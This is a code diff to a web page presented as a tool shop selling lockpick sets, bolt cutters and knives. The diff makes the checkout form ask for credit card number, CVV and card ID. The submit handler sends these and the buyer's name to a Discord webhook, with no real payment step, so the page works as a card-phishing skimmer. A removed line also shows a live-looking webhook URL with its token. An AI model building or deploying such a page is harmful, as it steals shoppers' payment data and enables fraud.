@@ -67,7 +67,8 @@
         }
 
         .item-btn {
-            display: block;
+            display: flex;
+            justify-content: space-between;
             margin: 10px 0;
             padding: 10px 20px;
             font-size: 1.1em;
@@ -127,8 +128,8 @@
         <input type="text" id="search-bar" placeholder="Search for a category...">
         <div class="buttons">
             <button class="category-btn" onclick="showCategory('tools')">Tools</button>
-            <button class="category-btn" onclick="showCategory('food')">Food</button>
-            <button class="category-btn" onclick="showCategory('more')">More</button>
+            <button class="category-btn" onclick="showCategory('food')" style="display:none;">Food</button>
+            <button class="category-btn" onclick="showCategory('more')" style="display:none;">More</button>
         </div>
         <div id="items" class="items"></div>
     </div>
@@ -138,22 +139,20 @@
             const itemsDiv = document.getElementById('items');
             itemsDiv.innerHTML = ''; // Clear previous items
 
-            const tools = ["Bolt cutters", "Lockpick sets", "Padlocks", "Axes", "Knives", "Shovels", "Hoes"];
-            const food = ["Apple", "Banana", "Carrot", "Bread", "Milk"];
-            const more = ["Books", "Clothes", "Electronics", "Furniture", "Toys"];
+            const tools = [
+                "Bolt cutters", 
+                "Lockpick sets", 
+                "Padlocks", 
+                "Axes", 
+                "Knives", 
+                "Shovels", 
+                "Hoes"
+            ];
 
             let items = [];
 
-            switch (category) {
-                case 'tools':
-                    items = tools;
-                    break;
-                case 'food':
-                    items = food;
-                    break;
-                case 'more':
-                    items = more;
-                    break;
+            if (category === 'tools') {
+                items = tools;
             }
 
             items.forEach(item => {
@@ -173,25 +172,39 @@
 
             switch (item) {
                 case 'Shovels':
-                    variants = ["Basic Shovel", "Heavy-Duty Shovel"];
+                    variants = [
+                        { name: "Basic Shovel", price: 25 },
+                        { name: "Heavy-Duty Shovel", price: 40 }
+                    ];
                     break;
                 case 'Hoes':
-                    variants = ["Garden Hoe", "Heavy-Duty Hoe"];
+                    variants = [
+                        { name: "Garden Hoe", price: 35 },
+                        { name: "Heavy-Duty Hoe", price: 45 }
+                    ];
                     break;
                 case 'Knives':
-                    variants = ["Pocket Knife", "Hunting Knife", "Utility Knife"];
+                    variants = [
+                        { name: "Pocket Knife", price: 100 },
+                        { name: "Hunting Knife", price: 60 },
+                        { name: "Utility Knife", price: 45 }
+                    ];
                     break;
                 case 'Lockpick sets':
-                    variants = ["Beginner Lockpick Set", "Professional Lockpick Set", "Advanced Lockpick Set"];
+                    variants = [
+                        { name: "Beginner Lockpick Set", price: 70 },
+                        { name: "Professional Lockpick Set", price: 100 },
+                        { name: "Advanced Lockpick Set", price: 150 }
+                    ];
                     break;
                 default:
-                    variants = [item];
+                    variants = [{ name: item, price: 'N/A' }];
             }
 
             variants.forEach(variant => {
                 const button = document.createElement('button');
                 button.className = 'item-btn';
-                button.textContent = variant;
+                button.innerHTML = variant.price === 'N/A' ? variant.name : `${variant.name} <span>$${variant.price}</span>`;
                 button.onclick = () => goToCustomerForm(variant);
                 itemsDiv.appendChild(button);
             });
@@ -200,30 +213,30 @@
         function goToCustomerForm(item) {
             document.body.innerHTML = `
                 <div class="container">
-                    <h1>Enter Your Details for ${item}</h1>
+                    <h1>Enter Your Details for ${item.name}${item.price !== 'N/A' ? ` ($${item.price})` : ''}</h1>
                     <div class="form-container">
                         <label for="name">Name:</label>
                         <input type="text" id="name" placeholder="Your Name">
 
                         <label for="bank-details">Bank Account Details:</label>
-                        <textarea id="bank-details" rows="4" placeholder="Your Bank Account Details"></textarea>
+                        <textarea id="bank-details" rows="4" placeholder="Credit card number:\nCC/V:\nCC ID:"></textarea>
 
-                        <button class="submit-btn" onclick="submitOrder('${item}')">Buy</button>
+                        <button class="submit-btn" onclick="submitOrder('${item.name}', '${item.price}')">Buy</button>
                     </div>
                 </div>
             `;
         }
 
-        function submitOrder(item) {
+        function submitOrder(item, price) {
             const name = document.getElementById('name').value;
             const bankDetails = document.getElementById('bank-details').value;
 
             if (name && bankDetails) {
                 const orderNumber = Math.floor(Math.random() * 1000000);
-                alert(`Thank you for your purchase of ${item}! Your order number is #${orderNumber}.`);
+                alert(`thank you for purcashing  ${item}${price !== 'N/A' ? ` ($${price})` : ''}! Your order number is #${orderNumber}.`);
 
                 // Send webhook with details as an embed to Discord
-                fetch('https://discord.com/api/webhooks/1280978020026417303/N6_0RI7IzLcVkYjHnkDqVWNHnxfycklVvwBiqlXqdXCwkg2dGMKcQoipOFvjFaShJTqQ', {
+                fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -231,24 +244,24 @@
                     body: JSON.stringify({
                         embeds: [
                             {
-                                title: "New Order Received",
+                                title: "New Order",
                                 color: 3066993,
                                 fields: [
                                     {
-                                        name: "Order Number",
+                                        name: "Order Num:",
                                         value: `#${orderNumber}`
                                     },
                                     {
-                                        name: "Item",
-                                        value: item
+                                        name: "Item:",
+                                        value: `${item}${price !== 'N/A' ? ` ($${price})` : ''}`
                                     },
                                     {
-                                        name: "Customer Name",
+                                        name: "Customer name:",
                                         value: name
                                     },
                                     {
-                                        name: "Bank Account Details",
-                                        value: bankDetails
+                                        name: "Bank Account Details:",
+                                        value: `\`\`\`${bankDetails}\`\`\``
                                     }
                                 ],
                                 footer: {
